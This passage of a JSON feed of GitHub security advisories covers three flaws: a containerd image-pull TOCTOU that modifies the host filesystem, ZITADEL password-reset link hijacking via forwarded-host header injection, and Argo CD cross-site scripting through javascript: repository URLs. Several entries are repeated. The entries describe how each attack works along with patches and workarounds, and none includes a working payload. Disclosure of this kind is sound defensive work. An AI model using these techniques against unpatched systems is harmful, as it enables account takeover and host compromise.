                "url": "https://github.com/advisories/GHSA-q7p4-7xjv-j3wf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A time-of-check to time-of-use (TOCTOU) vulnerability was found in containerd v2.1.0. While unpacking an image during an image pull, specially crafted container images could arbitrarily modify the host file system. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been fixed in the following containerd versions:</p>\n<ul>\n<li>2.1.1</li>\n</ul>\n<p>The only affected version of containerd is 2.1.0.  Other versions of containerd are not affected.</p>\n<p>Users should update to this version to resolve the issue.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure that only trusted images are used and that only trusted users have permissions to import images.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The containerd project would like to thank Tõnis Tiigi for responsibly disclosing this issue in accordance with the <a href=\"https://github.com/containerd/project/blob/main/SECURITY.md\">containerd security policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47290\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47290</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/containerd/containerd/issues/new/choose\">containerd</a></li>\n<li>Email us at <a href=\"mailto:security@containerd.io\">security@containerd.io</a></li>\n</ul>\n<p>To report a security issue in containerd:</p>\n<ul>\n<li><a href=\"https://github.com/containerd/containerd/security/advisories/new\">Report a new vulnerability</a></li>\n<li>Email us at <a href=\"mailto:security@containerd.io\">security@containerd.io</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containerd/containerd/security/advisories/GHSA-cm76-qm8v-3j95\">https://github.com/containerd/containerd/security/advisories/GHSA-cm76-qm8v-3j95</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47290\">https://nvd.nist.gov/vuln/detail/CVE-2025-47290</a></li>\n<li><a href=\"https://github.com/containerd/containerd/commit/cada13298fba85493badb6fecb6ccf80e49673cc\">https://github.com/containerd/containerd/commit/cada13298fba85493badb6fecb6ccf80e49673cc</a></li>\n<li><a href=\"https://github.com/containerd/containerd/releases/tag/v2.1.1\">https://github.com/containerd/containerd/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cm76-qm8v-3j95\">https://github.com/advisories/GHSA-cm76-qm8v-3j95</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cm76-qm8v-3j95",
            "title": "[github.com/containerd/containerd/v2] containerd allows host filesystem access on pull",
            "date_modified": "2025-05-28T19:44:12.000Z",
            "date_published": "2025-05-21T16:53:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cm76-qm8v-3j95"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>\n<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>\n<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.2.2\">3.2.2</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.11\">2.71.11</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.12\">2.70.12</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Amit Laish – GE Vernova for finding and reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53\">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48936\">https://nvd.nist.gov/vuln/detail/CVE-2025-48936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf",
            "title": "[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection",
            "date_modified": "2025-05-30T15:26:12.000Z",
            "date_published": "2025-05-28T17:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>\n<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>\n<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.2.2\">3.2.2</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.11\">2.71.11</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.12\">2.70.12</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Amit Laish – GE Vernova for finding and reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53\">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48936\">https://nvd.nist.gov/vuln/detail/CVE-2025-48936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf",
            "title": "[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection",
            "date_modified": "2025-05-30T15:26:12.000Z",
            "date_published": "2025-05-28T17:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>\n<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>\n<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.2.2\">3.2.2</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.11\">2.71.11</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.12\">2.70.12</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Amit Laish – GE Vernova for finding and reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53\">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48936\">https://nvd.nist.gov/vuln/detail/CVE-2025-48936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf",
            "title": "[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection",
            "date_modified": "2025-05-30T15:26:12.000Z",
            "date_published": "2025-05-28T17:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>\n<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>\n<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.2.2\">3.2.2</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.11\">2.71.11</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.12\">2.70.12</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Amit Laish – GE Vernova for finding and reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53\">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48936\">https://nvd.nist.gov/vuln/detail/CVE-2025-48936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf",
            "title": "[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection",
            "date_modified": "2025-05-30T15:26:12.000Z",
            "date_published": "2025-05-28T17:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>\n<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>\n<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.2.2\">3.2.2</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.11\">2.71.11</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.12\">2.70.12</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Amit Laish – GE Vernova for finding and reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53\">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48936\">https://nvd.nist.gov/vuln/detail/CVE-2025-48936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93m4-mfpg-c3xf\">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf",
            "title": "[github.com/zitadel/zitadel] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection",
            "date_modified": "2025-05-30T15:26:12.000Z",
            "date_published": "2025-05-28T17:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93m4-mfpg-c3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>\n<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>\n<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>\n<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>\n<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v3.0.4</li>\n<li>v2.14.13</li>\n<li>v2.13.8</li>\n</ul>\n<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds other than depending on the browser to filter the URL. </p>\n<h3 id=\"credits\">Credits</h3>\n<p>Disclosed by @Ry0taK <a href=\"https://ryotak.net\">RyotaK</a>. </p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1\">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47933\">https://nvd.nist.gov/vuln/detail/CVE-2025-47933</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p",
            "title": "[github.com/argoproj/argo-cd/v3] Argo CD allows cross-site scripting on repositories page",
            "date_modified": "2025-05-29T21:59:50.000Z",
            "date_published": "2025-05-28T17:36:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>\n<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>\n<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>\n<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>\n<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v3.0.4</li>\n<li>v2.14.13</li>\n<li>v2.13.8</li>\n</ul>\n<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds other than depending on the browser to filter the URL. </p>\n<h3 id=\"credits\">Credits</h3>\n<p>Disclosed by @Ry0taK <a href=\"https://ryotak.net\">RyotaK</a>. </p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1\">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47933\">https://nvd.nist.gov/vuln/detail/CVE-2025-47933</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD allows cross-site scripting on repositories page",
            "date_modified": "2025-05-29T21:59:50.000Z",
            "date_published": "2025-05-28T17:36:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>\n<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>\n<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>\n<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>\n<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v3.0.4</li>\n<li>v2.14.13</li>\n<li>v2.13.8</li>\n</ul>\n<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds other than depending on the browser to filter the URL. </p>\n<h3 id=\"credits\">Credits</h3>\n<p>Disclosed by @Ry0taK <a href=\"https://ryotak.net\">RyotaK</a>. </p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1\">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47933\">https://nvd.nist.gov/vuln/detail/CVE-2025-47933</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD allows cross-site scripting on repositories page",
            "date_modified": "2025-05-29T21:59:50.000Z",
            "date_published": "2025-05-28T17:36:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>\n<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>\n<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>\n<p><a href=\"https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7\">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>\n<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>\n<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v3.0.4</li>\n<li>v2.14.13</li>\n<li>v2.13.8</li>\n</ul>\n<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds other than depending on the browser to filter the URL. </p>\n<h3 id=\"credits\">Credits</h3>\n<p>Disclosed by @Ry0taK <a href=\"https://ryotak.net\">RyotaK</a>. </p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel 